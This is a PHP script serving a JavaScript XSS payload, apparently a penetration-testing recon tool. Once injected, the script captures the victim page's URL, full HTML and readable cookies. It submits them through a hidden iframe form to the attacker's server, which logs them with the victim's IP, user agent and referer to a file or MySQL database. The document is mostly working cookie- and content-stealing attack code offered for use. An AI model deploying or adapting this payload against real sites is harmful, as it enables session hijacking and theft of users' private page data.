<?php
  header('Content-type: text/javascript');
  error_reporting(E_ALL);
  /**
    Gain situational awareness of where this script executed. 
    One to follow up with if you get collaborator / sleepy puppy call back with an asynchronously executed payload
    Effectively does:
     - Cookiestealer
     - Contentstealer
    
    payloads, plus:
     - Get URL this was executed on
     - Get URL that this script was referred to with (e.g. if unique identifiers were used)
     - IP, user agent of the user that executed it
  */

  // Settings

  // Pick either DB or file logging by commenting one of these out
  $logging = 'db';
  // $logging = 'file';
  
  // If you're using file logging, this is the path of the log file that the web server can write to
  $log_file = '/var/log/xssrecon.log'; 

  // If you're using DB logging, set these up and make sure the those creds have access to the schema
  $db_user = 'xssrecon';
  $db_pass = 'xssrecon';
  $db_name = 'xssrecon';
  $db_host = 'localhost';

  // Use this SQL to set up the DB
  // CREATE TABLE log ( id int NOT NULL AUTO_INCREMENT, logtime DATETIME, method varchar(10), pageurl varchar(255), scripturl varchar(255), referer varchar(255), cookies varchar(255), useragent varchar(255), userip varchar(20), html TEXT, PRIMARY KEY (id) )

  $url = 'http';
  if( !empty( $_SERVER['HTTPS'] ) ){
    $url .= 's';
  }
  $url .= "://";
  if( empty( $_SERVER['HTTP_HOST'] ) ){
    $url .= $_SERVER["SERVER_ADDR"];
  }else{
    $url .= $_SERVER['HTTP_HOST'];
  }
  $url .= $_SERVER["PHP_SELF"];

  if( empty( $_POST["c"] ) ){

?>

  // Send back
  function xssSendContent(content){
    document.getElementById('info').value = content;
    window.onload = null;
    document.getElementById('form_xss').submit();
  }
  function xssGatherInfo(){
    
    var info = {};

    // Current URL
    info.pageurl = document.location.href;

    // Contents of current page
    info.html = document.documentElement.outerHTML; 

    // Any non HttpOnly cookies present
    info.cookies = document.cookies

    document.documentElement.innerHTML += 'A';
    if( !document.getElementById('frame_xss') ){
      frame = document.createElement('iframe');
      frame.style='visibility: hidden;';
      frame.name='frame_xss';
      form = document.createElement('form');
      form.action = '<?php echo $url; ?>'

      form.target = 'frame_xss';
      form.method='POST';
      form.id = 'form_xss';
      e = document.createElement('input');
      e.type = 'hidden';
      e.name = 'c';
      e.id = 'info';
      form.appendChild(e);
      body = document.getElementsByTagName('body')
      if( body.length = 0 ){
        document.documentElement.appendChild(document.createElement('body'));
        body = document.getElementsByTagName('body')
      }
      body = body[0];
      body.appendChild(frame);
      body.appendChild(form);
    }
    xssSendContent(btoa(JSON.stringify(info)));
  }
  window.onload = xssGatherInfo;

<?php
    
  }else{

    // If you've got POST data coming in, record it
    echo $_POST['c'];

    $info = json_decode(base64_decode($_POST['c']));
  
  }

  if( !isset( $info ) ){
    $info = new StdClass();
  }
  
  // URL of the script itself
  $info->scripturl = $url;

  // Referer
  $info->referer = $_SERVER['HTTP_REFERER'];

  // User's user agent
  $info->useragent = $_SERVER['HTTP_USER_AGENT'];

  // User's IP address
  $info->userip = $_SERVER['REMOTE_ADDR'];

  $info->method = $_SERVER['REQUEST_METHOD'];

  $info->logtime = date('Y-m-d H:i:s');

  $aProperties = array( 'logtime', 'method', 'pageurl', 'scripturl', 'referer', 'cookies', 'useragent', 'userip', 'html' );
  
  // Log this request
  if( $logging == 'file' ){
    // File logging
    
    $str = '';
    $str .= "\n\n===START XSS INFO===\n\n";
    foreach( $aProperties as $prop ){
      if( !property_exists( $info, $prop ) ) continue;
      $str .= $prop.": ".$info->{$prop}."\n";
    }
    $str .= "\n\n===END XSS INFO===\n\n";
    file_put_contents( $log_file, $str, FILE_APPEND ); 
  }else{
    // DB logging

    $db = new PDO("mysql:host={$db_host};dbname={$db_name};charset=utf8", $db_user, $db_pass);
    $present = "";
    $markers = "";
    $comma = "";
    $data = array();
    foreach( $aProperties as $prop ){
      if( !property_exists( $info, $prop ) ) continue;
      $present .= $comma.' '.$prop; 
      $markers .= $comma." ?";
      $data[] = $info->{$prop};
      $comma = ",";
    }
    $sql = "INSERT INTO log (".$present." ) VALUES (".$markers." )";
    $stmt = $db->prepare($sql);
    $stmt->execute($data);
  }

?>
